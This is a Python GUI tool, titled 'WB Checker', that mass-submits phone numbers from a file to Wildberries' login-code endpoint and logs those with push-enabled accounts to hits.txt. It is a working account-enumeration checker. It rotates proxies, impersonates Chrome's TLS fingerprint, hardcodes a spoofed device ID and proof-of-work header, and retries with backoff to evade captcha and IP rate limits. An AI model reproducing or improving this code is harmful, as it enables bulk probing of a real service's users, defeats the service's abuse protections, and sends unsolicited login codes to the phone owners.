# -*- coding: utf-8 -*-
"""
WB Checker — объединённая версия checker (2).py + WB.py
GUI + прокси + retry + async
"""
import asyncio
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import os
import threading
import aiohttp
import time
import json
import random
import uuid
import requests
from typing import Optional

try:
    from curl_cffi import requests as curl_cffi_requests
except ImportError:
    curl_cffi_requests = None

CHROME_IMPERSONATE = "chrome120"
WB_WARMUP_URL = "https://www.wildberries.ru/security/login"
CHROME120_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

# ============================================================================
# КОНФИГУРАЦИЯ
# ============================================================================
CONCURRENT_REQUESTS = 5
REQUEST_TIMEOUT = 20
API_URL = "https://wbx-auth.wildberries.ru/v2/code/wb-captcha"
MAX_RETRIES = 50
MAX_CAPTCHA_REQUEUE = 6
RETRY_BACKOFF_BASE = 0.35
RETRY_BACKOFF_MAX = 4.0
CAPTCHA_REQUEUE_EXTRA_MIN = 12.0
CAPTCHA_REQUEUE_EXTRA_MAX = 35.0
# «Живой» отчёт в лог, как в fssp/1.py (консольные пульсы)
LIVE_STATUS_INTERVAL_MS = 2000
# Без прокси WB быстро режет по IP: интервал + мало потоков важнее curl.
MIN_REQUEST_INTERVAL_SEC = 0.4

REQUEST_HEADERS = {
    'accept': '*/*',
    'accept-language': 'ru,en;q=0.9',
    'content-type': 'text/plain;charset=UTF-8',
    'deviceid': 'site_26ffa6f344394fdfb7c84a3c0db55c05',
    'origin': 'https://www.wildberries.ru',
    'priority': 'u=1, i',
    'referer': 'https://www.wildberries.ru/',
    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "YaBrowser";v="25.8", "Yowser";v="2.5"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 YaBrowser/25.8.0.0 Safari/537.36',
    'wb-apptype': 'web',
    'wb-appversion': '13.11.3',
}

# Альтернативные заголовки из WB.py (на случай если основные не работают)
REQUEST_HEADERS_ALT = {
    'accept': '*/*',
    'accept-language': 'ru-RU,ru;q=0.9',
    'content-type': 'application/json;charset=UTF-8',
    'deviceid': None,  # генерируется uuid
    'origin': 'https://www.wildberries.ru',
    'referer': 'https://www.wildberries.ru/security/login',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'wb-apptype': 'web',
    'wb-appversion': '10.0.48.1',
}

# В hits пишем только push (SMS успех не считаем).
WB_HIT_AUTH_METHODS = frozenset({'push'})

_curl_thread_local = threading.local()


def _wb_parse_result(data: dict):
    """result из API может быть int или str; отсутствие — -1."""
    r = data.get('result')
    if r is None or r == '':
        return -1
    try:
        return int(r)
    except (TypeError, ValueError):
        return -1


def _wb_payload_dict(data: dict) -> dict:
    """payload в ответе может быть null — иначе ломается .get."""
    p = data.get('payload')
    return p if isinstance(p, dict) else {}


def _wb_is_need_captcha(data: dict, result_code: int) -> bool:
    if result_code == 3:
        return True
    err = data.get('error')
    if err == 'need captcha':
        return True
    return False


def _wb_post_curl_sync(
    api_url: str,
    hdrs: dict,
    body: bytes,
    proxy_url: Optional[str],
    timeout_sec: int,
):
    """curl_cffi: сессия на поток (ThreadPoolExecutor), один прогрев на поток."""
    if curl_cffi_requests is None:
        raise RuntimeError("curl_cffi")
    tls = _curl_thread_local
    if getattr(tls, "session", None) is None:
        tls.session = curl_cffi_requests.Session(impersonate=CHROME_IMPERSONATE)
        tls.session.headers.update(
            {"User-Agent": CHROME120_UA, "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8"}
        )
        tls.warmed = False
    s = tls.session
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    warm_t = min(10, max(1, int(timeout_sec or 10)))
    if not tls.warmed:
        try:
            s.get(WB_WARMUP_URL, timeout=warm_t, proxies=proxies)
        except Exception:
            pass
        tls.warmed = True
    kw = {"timeout": timeout_sec, "headers": hdrs, "data": body}
    if proxies:
        kw["proxies"] = proxies
    r = s.post(api_url, **kw)
    return r.status_code, r.text


class GlobalRequestPacer:
    def __init__(self, min_interval_sec: float):
        self._floor = max(0.0, float(min_interval_sec))
        self.min_interval = self._floor
        self._cap_sec = 5.0
        self._lock = asyncio.Lock()
        self._next_slot = 0.0

    async def penalize_after_captcha(self):
        async with self._lock:
            self.min_interval = min(
                self._cap_sec,
                max(self.min_interval * 1.22, self._floor) + 0.1,
            )

    async def wait_turn(self):
        if self.min_interval <= 0:
            return
        async with self._lock:
            now = time.monotonic()
            if now < self._next_slot:
                delay = self._next_slot - now
            else:
                delay = 0.0
            jitter = random.uniform(0, self.min_interval * 0.35)
            self._next_slot = max(self._next_slot, now) + self.min_interval + jitter
        if delay > 0:
            await asyncio.sleep(delay)

# ============================================================================
# GUI
# ============================================================================
class App:
    def __init__(self, root):
        self.root = root
        self.root.title("WB CHECKER (checker + WB)")
        self.root.geometry("900x550")
        self.root.resizable(False, False)

        self.is_running = False
        self.phones_list = []
        self.total_phones = 0
        self.checked_count = 0
        self.hits_count = 0
        self.captcha_count = 0
        self.start_time = None
        self.proxies = []
        self.proxy_lock = threading.Lock()
        self.retries = {}
        self.use_alt_headers = tk.BooleanVar(value=False)
        self.use_curl_tls = tk.BooleanVar(value=curl_cffi_requests is not None)
        self.min_interval_var = tk.DoubleVar(value=MIN_REQUEST_INTERVAL_SEC)
        self.captcha_retries_var = tk.IntVar(value=MAX_CAPTCHA_REQUEUE)
        self.state_lock = threading.Lock()
        self.completed_phones = set()
        self.first_response_logged = False
        self.first_response_lock = threading.Lock()
        self._live_status_after_id = None

        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

        main_frame = ttk.Frame(root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)

        file_frame = ttk.LabelFrame(main_frame, text="Файлы", padding="10")
        file_frame.pack(fill=tk.X, pady=5)

        ttk.Label(file_frame, text="Номера:").grid(row=0, column=0, sticky=tk.W, padx=5)
        self.phones_path = tk.StringVar()
        ttk.Entry(file_frame, textvariable=self.phones_path, width=50).grid(row=0, column=1, sticky=tk.EW)
        ttk.Button(file_frame, text="Обзор...", command=self.browse_phones).grid(row=0, column=2, padx=5)

        ttk.Label(file_frame, text="Результат:").grid(row=1, column=0, sticky=tk.W, padx=5)
        self.hits_path = tk.StringVar(value="hits.txt")
        ttk.Entry(file_frame, textvariable=self.hits_path, width=50).grid(row=1, column=1, sticky=tk.EW)
        ttk.Button(file_frame, text="Обзор...", command=self.browse_hits).grid(row=1, column=2, padx=5)

        ttk.Label(file_frame, text="Прокси API:").grid(row=2, column=0, sticky=tk.W, padx=5)
        self.proxy_api = tk.StringVar(value="")
        ttk.Entry(file_frame, textvariable=self.proxy_api, width=50).grid(row=2, column=1, sticky=tk.EW)
        ttk.Label(file_frame, text="(пусто = без прокси)").grid(row=2, column=2, sticky=tk.W)

        settings_frame = ttk.LabelFrame(main_frame, text="Настройки", padding="10")
        settings_frame.pack(fill=tk.X, pady=5)

        ttk.Label(settings_frame, text="Потоки:").pack(side=tk.LEFT, padx=5)
        self.concurrency_var = tk.IntVar(value=CONCURRENT_REQUESTS)
        ttk.Spinbox(settings_frame, from_=1, to=2000, increment=1, textvariable=self.concurrency_var, width=7).pack(side=tk.LEFT, padx=2)

        ttk.Label(settings_frame, text="Повторов:").pack(side=tk.LEFT, padx=(15, 5))
        self.retries_var = tk.IntVar(value=MAX_RETRIES)
        ttk.Spinbox(settings_frame, from_=1, to=100, textvariable=self.retries_var, width=5).pack(side=tk.LEFT, padx=2)
        ttk.Label(settings_frame, text="капча:").pack(side=tk.LEFT, padx=(8, 2))
        ttk.Spinbox(settings_frame, from_=0, to=30, textvariable=self.captcha_retries_var, width=4).pack(
            side=tk.LEFT, padx=2
        )

        ttk.Checkbutton(settings_frame, text="Альт. заголовки (WB.py)", variable=self.use_alt_headers).pack(side=tk.LEFT, padx=15)
        tls_lbl = "curl_cffi (рекоменд.)"
        if curl_cffi_requests is None:
            tls_lbl += " — pip install curl-cffi"
        self._curl_cb = ttk.Checkbutton(settings_frame, text=tls_lbl, variable=self.use_curl_tls)
        self._curl_cb.pack(side=tk.LEFT, padx=(6, 0))
        if curl_cffi_requests is None:
            self._curl_cb.state(["disabled"])
            self.use_curl_tls.set(False)
        ttk.Label(settings_frame, text="интервал(с):").pack(side=tk.LEFT, padx=(10, 4))
        ttk.Spinbox(
            settings_frame,
            from_=0.0,
            to=5.0,
            increment=0.05,
            textvariable=self.min_interval_var,
            width=5,
            format="%.2f",
        ).pack(side=tk.LEFT, padx=2)

        control_frame = ttk.Frame(main_frame, padding="10")
        control_frame.pack(fill=tk.X)

        self.start_button = ttk.Button(control_frame, text="Start", command=self.start_checking)
        self.start_button.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)

        self.stop_button = ttk.Button(control_frame, text="Stop", command=self.stop_checking, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)

        progress_frame = ttk.LabelFrame(main_frame, text="Процесс", padding="10")
        progress_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        self.progress_label = ttk.Label(
            progress_frame, text="Проверено: 0/0 | Найдено: 0 | CAPTCHA: 0 | RPS: 0 | ETA: —"
        )
        self.progress_label.pack(fill=tk.X)

        self.progress = ttk.Progressbar(progress_frame, orient="horizontal", mode="determinate")
        self.progress.pack(fill=tk.X, pady=5)

        self.log_area = scrolledtext.ScrolledText(progress_frame, wrap=tk.WORD, height=12,
                                                  bg="black", fg="#00FF00", font=("Consolas", 9))
        self.log_area.pack(fill=tk.BOTH, expand=True)

    def browse_phones(self):
        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if path:
            self.phones_path.set(path)

    def browse_hits(self):
        path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if path:
            self.hits_path.set(path)

    def log(self, message):
        self.root.after(0, self._log, message)

    def _log(self, message):
        self.log_area.insert(tk.END, message + "\n")
        self.log_area.see(tk.END)

    def update_progress(self):
        if not self.is_running:
            return
        if self.total_phones > 0:
            self.progress['value'] = (self.checked_count / self.total_phones) * 100
        speed = 0.0
        eta_str = "—"
        if self.start_time and self.checked_count > 0:
            elapsed = time.time() - self.start_time
            speed = (self.checked_count / elapsed) if elapsed > 0 else 0.0
            remain = max(0, self.total_phones - self.checked_count)
            if speed > 0 and remain > 0:
                eta_sec = int(remain / speed)
                eta_str = f"~{eta_sec}с"
            elif remain <= 0:
                eta_str = "0с"
        rps_i = int(speed) if speed > 0 else 0
        with self.proxy_lock:
            px_left = len(self.proxies)
        self.progress_label.config(
            text=(
                f"Проверено: {self.checked_count}/{self.total_phones} | "
                f"Найдено: {self.hits_count} | CAPTCHA: {self.captcha_count} | "
                f"RPS: {rps_i} | ETA: {eta_str} | прокси: {px_left}"
            )
        )
        self.root.after(100, self.update_progress)

    def _schedule_live_status(self):
        if self._live_status_after_id is not None:
            try:
                self.root.after_cancel(self._live_status_after_id)
            except (tk.TclError, ValueError):
                pass
            self._live_status_after_id = None
        if not self.is_running:
            return
        self._live_status_after_id = self.root.after(LIVE_STATUS_INTERVAL_MS, self._live_status_tick)

    def _live_status_tick(self):
        if not self.is_running:
            return
        elapsed = time.time() - self.start_time if self.start_time else 0.0
        speed = (self.checked_count / elapsed) if elapsed > 0 else 0.0
        remain = max(0, self.total_phones - self.checked_count)
        eta_sec = int(remain / speed) if speed > 0 and remain > 0 else -1
        pct = (100.0 * self.checked_count / self.total_phones) if self.total_phones else 0.0
        with self.proxy_lock:
            px = len(self.proxies)
        eta_txt = f"~{eta_sec}с" if eta_sec >= 0 else "…"
        self.log(
            f"[пульс] {pct:.1f}% | {self.checked_count}/{self.total_phones} | "
            f"PUSH {self.hits_count} | CAPTCHA {self.captcha_count} | "
            f"{speed:.1f}/с | ETA {eta_txt} | прокси {px}"
        )
        self._schedule_live_status()

    def on_closing(self):
        if self.is_running:
            self.stop_checking()
        self.root.destroy()

    def load_proxies(self):
        api = self.proxy_api.get().strip()
        if not api:
            return []
        try:
            r = requests.get(api, timeout=10)
            if r.status_code == 200:
                proxies = [p.strip() for p in r.text.splitlines() if p.strip()]
                self.log(f"Загружено {len(proxies)} прокси")
                return proxies
            self.log(f"Ошибка загрузки прокси: {r.status_code}")
        except Exception as e:
            self.log(f"Ошибка прокси API: {e}")
        return []

    def get_proxy(self):
        with self.proxy_lock:
            if not self.proxies:
                return None
            return random.choice(self.proxies)

    def remove_proxy(self, proxy):
        with self.proxy_lock:
            if proxy in self.proxies:
                self.proxies.remove(proxy)

    def start_checking(self):
        if self.is_running:
            return
        phones_file = self.phones_path.get()
        if not os.path.exists(phones_file):
            messagebox.showerror("Ошибка", "Файл с номерами не найден!")
            return
        try:
            with open(phones_file, 'r', encoding='utf-8') as f:
                self.phones_list = [line.strip() for line in f if line.strip()]
            self.total_phones = len(self.phones_list)
            if self.total_phones == 0:
                messagebox.showwarning("Внимание", "Файл пуст!")
                return
        except Exception as e:
            self.log(f"Ошибка чтения: {e}")
            return

        self.proxies = self.load_proxies()
        self.retries = {p: 0 for p in self.phones_list}
        self.captcha_retries = {p: 0 for p in self.phones_list}
        self._first_captcha_body_logged = False
        self.is_running = True
        self.checked_count = 0
        self.hits_count = 0
        self.captcha_count = 0
        self.first_response_logged = False
        self.completed_phones = set()
        self.start_time = time.time()
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log_area.delete('1.0', tk.END)
        self.log(f"Загружено {self.total_phones} номеров. Прокси: {len(self.proxies)}. Запуск...")
        cw = max(1, int(self.concurrency_var.get()))
        if not self.proxies and cw > 8:
            self.log(
                "Без прокси WB режет по IP: при многих потоках почти все ответы — капча. "
                "Поставьте потоки ≤8, интервал 0.35–0.6 с или используйте прокси."
            )
        if curl_cffi_requests and self.use_curl_tls.get():
            self.log("Режим: curl_cffi + прогрев страницы (как в fssp) — меньше ложной капчи, чем у aiohttp.")
        elif not curl_cffi_requests:
            self.log("Внимание: без curl_cffi запросы идут через aiohttp — WB чаще отвечает result:3. Установите: pip install curl-cffi")
        self.log(f"Каждые {LIVE_STATUS_INTERVAL_MS // 1000}с — строка [пульс] в лог (как отчёт в fssp).")
        self.log("В hits.txt попадают только номера с auth_method=push (SMS не записываем).")

        self.checker_thread = threading.Thread(target=self._run_async_checker, daemon=True)
        self.checker_thread.start()
        self.update_progress()
        self._schedule_live_status()

    def stop_checking(self):
        if not self.is_running:
            return
        self.log("Остановка...")
        self.is_running = False
        if self._live_status_after_id is not None:
            try:
                self.root.after_cancel(self._live_status_after_id)
            except (tk.TclError, ValueError):
                pass
            self._live_status_after_id = None
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

    def _run_async_checker(self):
        loop = None
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self._run_checker_impl())
        except Exception as e:
            self.log(f"Критическая ошибка: {e}")
        finally:
            if loop and not loop.is_closed():
                loop.close()

    async def _run_checker_impl(self):
        hits_file = self.hits_path.get()
        concurrency = max(1, int(self.concurrency_var.get()))
        max_retries = max(0, int(self.retries_var.get()))
        max_captcha_rq = max(0, int(self.captcha_retries_var.get()))
        semaphore = asyncio.Semaphore(concurrency)
        use_alt = self.use_alt_headers.get()
        use_curl = bool(self.use_curl_tls.get() and curl_cffi_requests is not None)
        try:
            min_iv = float(self.min_interval_var.get())
        except (tk.TclError, ValueError):
            min_iv = MIN_REQUEST_INTERVAL_SEC
        pacer = GlobalRequestPacer(min_iv)

        retry_queue = asyncio.Queue()
        for p in self.phones_list:
            retry_queue.put_nowait(p)

        async def worker(session):
            while True:
                if self._should_stop_workers(retry_queue):
                    break
                try:
                    phone = await asyncio.wait_for(retry_queue.get(), timeout=0.2)
                except asyncio.TimeoutError:
                    if self._should_stop_workers(retry_queue):
                        break
                    continue
                try:
                    if self.is_running:
                        await self.check_phone(
                            phone,
                            session,
                            semaphore,
                            pacer,
                            hits_file,
                            max_retries,
                            max_captcha_rq,
                            use_alt,
                            use_curl,
                            retry_queue,
                        )
                    else:
                        self._mark_phone_done(phone)
                finally:
                    retry_queue.task_done()

        try:
            async with aiohttp.ClientSession() as session:
                n_workers = min(concurrency, self.total_phones)
                tasks = [asyncio.create_task(worker(session)) for _ in range(n_workers)]
                await asyncio.gather(*tasks)
        except Exception as e:
            self.log(f"Ошибка: {e}")
        finally:
            def finish():
                if self._live_status_after_id is not None:
                    try:
                        self.root.after_cancel(self._live_status_after_id)
                    except (tk.TclError, ValueError):
                        pass
                    self._live_status_after_id = None
                if self.is_running:
                    elapsed = time.time() - self.start_time
                    self.log(f"\nЗавершено за {elapsed:.2f}с. Найдено: {self.hits_count}")
                    messagebox.showinfo("Готово", f"Найдено: {self.hits_count}\nВремя: {elapsed:.2f}с")
                self.is_running = False
                self.start_button.config(state=tk.NORMAL)
                self.stop_button.config(state=tk.DISABLED)
            self.root.after(0, finish)

    def _mark_phone_done(self, phone):
        with self.state_lock:
            if phone not in self.completed_phones:
                self.completed_phones.add(phone)
                self.checked_count += 1

    def _all_phones_processed(self):
        with self.state_lock:
            return len(self.completed_phones) >= self.total_phones

    def _should_stop_workers(self, retry_queue):
        if (not self.is_running) and retry_queue.empty():
            return True
        return retry_queue.empty() and self._all_phones_processed()

    async def _requeue_with_backoff(self, phone, retry_queue, *, extra_delay=0.0):
        attempt = self.retries.get(phone, 0)
        delay = min(RETRY_BACKOFF_MAX, RETRY_BACKOFF_BASE * (2 ** min(attempt, 6)))
        delay = delay + random.uniform(0, 0.25) + max(0.0, float(extra_delay))
        await asyncio.sleep(delay)
        if self.is_running:
            retry_queue.put_nowait(phone)

    async def check_phone(
        self,
        phone,
        session,
        semaphore,
        pacer,
        hits_file,
        max_retries,
        max_captcha_rq,
        use_alt,
        use_curl,
        retry_queue,
    ):
        if not self.is_running:
            self._mark_phone_done(phone)
            return

        # Долгий backoff нельзя держать под semaphore — иначе все потоки «спят» и счётчик не двигается.
        pending_requeue_extra: Optional[float] = None
        pending_std_requeue = False

        async with semaphore:
            if not self.is_running:
                self._mark_phone_done(phone)
                return

            await pacer.wait_turn()

            headers = REQUEST_HEADERS_ALT.copy() if use_alt else REQUEST_HEADERS.copy()
            if use_alt:
                headers['deviceid'] = str(uuid.uuid4())
                req_payload = {"phone_number": phone}
            else:
                headers['x-request-id'] = str(uuid.uuid4())
                headers['x-correlation-id'] = str(uuid.uuid4())
                headers['x-pow'] = '2|site_26ffa6f344394fdfb7c84a3c0db55c05|1762360499|8,8,1,28f5c28f5c28f5c,000049ff-ffdb-4914-be4f-a006529e4c99,f8055962-4982-4fb0-ba08-7f1ff75d9001,1762360606,1,+LBRVdEGatk3Oc/YUpwiXYAH7+ee+oSzgHTKQ0xIR7o=,50c4f9eec5a8f9ea2c8907019ac16710094a27d012fa4978afaf0e8f156bdb80766a35b1e50c17915cf1c8d4133cec6c992a30b05236d8272206007c8668239a|199'
                req_payload = {"phone_number": phone, "captcha_token": ""}

            proxy = self.get_proxy()
            proxy_url = f"http://{proxy}" if proxy else None
            hdrs = {k: v for k, v in headers.items() if v}
            raw_body = json.dumps(req_payload, ensure_ascii=False, separators=(',', ':')).encode('utf-8')

            try:
                if use_curl:
                    status, text = await asyncio.to_thread(
                        _wb_post_curl_sync, API_URL, hdrs, raw_body, proxy_url, REQUEST_TIMEOUT
                    )
                elif use_alt:
                    async with session.post(
                        API_URL, headers=hdrs, json=req_payload, timeout=REQUEST_TIMEOUT, proxy=proxy_url
                    ) as response:
                        status = response.status
                        text = await response.text()
                else:
                    async with session.post(
                        API_URL, headers=hdrs, data=raw_body, timeout=REQUEST_TIMEOUT, proxy=proxy_url
                    ) as response:
                        status = response.status
                        text = await response.text()

                with self.first_response_lock:
                    if not self.first_response_logged:
                        self.first_response_logged = True
                        self.log(f"Первый ответ (статус {status}): {text[:400]}")

                if status == 200:
                    try:
                        data = json.loads(text) if text else {}
                    except json.JSONDecodeError:
                        data = {}
                        self.log(f"[{phone}] битый JSON в ответе")
                    if not isinstance(data, dict):
                        data = {}
                    result_code = _wb_parse_result(data)
                    resp_payload = _wb_payload_dict(data)
                    auth_method = (resp_payload.get('auth_method') or '').strip().lower()

                    if _wb_is_need_captcha(data, result_code):
                        await pacer.penalize_after_captcha()
                        self.captcha_count += 1
                        if proxy:
                            self.remove_proxy(proxy)
                        with self.first_response_lock:
                            if not self._first_captcha_body_logged:
                                self._first_captcha_body_logged = True
                                self.log(f"Пример ответа капчи: {text[:320]}")
                        cr = self.captcha_retries.get(phone, 0)
                        if cr < max_captcha_rq and self.is_running:
                            self.captcha_retries[phone] = cr + 1
                            self.log(
                                f"[{phone}] капча, пауза и повтор {cr + 1}/{max_captcha_rq} "
                                f"(глоб. интервал увеличен)"
                            )
                            pending_requeue_extra = random.uniform(
                                CAPTCHA_REQUEUE_EXTRA_MIN, CAPTCHA_REQUEUE_EXTRA_MAX
                            )
                        else:
                            self.log(f"[{phone}] капча, снято (лимит повторов капчи)")
                            self._mark_phone_done(phone)
                    else:
                        code_ok = result_code == 0
                        is_hit = code_ok and auth_method in WB_HIT_AUTH_METHODS
                        if is_hit:
                            self.hits_count += 1
                            self.log(f"[{phone}] PUSH")
                            try:
                                with open(hits_file, 'a', encoding='utf-8') as f:
                                    f.write(f"{phone}\n")
                            except OSError as e:
                                self.log(f"[{phone}] ошибка записи hits: {e}")
                        self._mark_phone_done(phone)
                elif status in (429, 403) and proxy:
                    self.remove_proxy(proxy)
                    if self.retries.get(phone, 0) < max_retries:
                        self.retries[phone] = self.retries.get(phone, 0) + 1
                        pending_std_requeue = True
                    else:
                        self._mark_phone_done(phone)
                else:
                    if self.retries.get(phone, 0) < max_retries:
                        self.retries[phone] = self.retries.get(phone, 0) + 1
                        pending_std_requeue = True
                    else:
                        self._mark_phone_done(phone)
            except (aiohttp.ClientProxyConnectionError, asyncio.TimeoutError):
                if proxy:
                    self.remove_proxy(proxy)
                if self.retries.get(phone, 0) < max_retries:
                    self.retries[phone] = self.retries.get(phone, 0) + 1
                    pending_std_requeue = True
                else:
                    self._mark_phone_done(phone)
            except Exception:
                if self.retries.get(phone, 0) < max_retries:
                    self.retries[phone] = self.retries.get(phone, 0) + 1
                    pending_std_requeue = True
                else:
                    self._mark_phone_done(phone)

        if pending_requeue_extra is not None:
            await self._requeue_with_backoff(phone, retry_queue, extra_delay=pending_requeue_extra)
            return
        if pending_std_requeue and self.is_running:
            await self._requeue_with_backoff(phone, retry_queue, extra_delay=0.0)


if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()
